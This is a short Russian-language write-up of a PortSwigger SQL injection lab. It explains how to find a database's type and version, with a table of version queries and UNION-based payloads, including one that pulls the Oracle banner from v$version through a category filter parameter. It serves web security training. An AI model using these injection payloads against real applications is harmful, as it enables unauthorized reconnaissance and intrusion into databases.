# SQL injection attack, querying the database type and version on Oracle

## Theory

<h3>Запрос типа и версии базы данных</h3>

Разные базы данных предоставляют разные способы запроса своей версии.

Часто приходится пробовать разные запросы, чтобы найти работающий, позволяющий определить как тип, так и версию программного обеспечения базы данных.

[Запросы для определения версии базы данных для некоторых популярных типов баз данных](https://github.com/fobblified/Writeups/tree/main/Portswigger/SQL_injection/SQL_injection_cheatsheet#Database_version)

```
Database type       Query

Microsoft, MySQL    SELECT @@version
Oracle              SELECT * FROM v$version
PostgreSQL          SELECT version()
```

Например, вы можно использовать атаку UNION со следующими входными данными:
```
' UNION SELECT @@version--
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_querying_the_database_type_and_version_on_Oracle/assets/1.png)

Выбираем пункт Gifts. Определяем [количество стобцов](https://github.com/fobblified/Writeups/tree/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_determining_the_number_of_columns_returned_by_the_query) и какой [тип данных](https://github.com/fobblified/Writeups/tree/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_finding_a_column_containing_text) они принимают. Вытаскиваем версию базы данных Oracle:
```
/filter?category=Gifts'UNION+SELECT+NULL,banner+FROM+v$version--
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_querying_the_database_type_and_version_on_Oracle/assets/2.png)

Отправляем запрос и получаем ответ от приложения.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_querying_the_database_type_and_version_on_Oracle/assets/3.png)
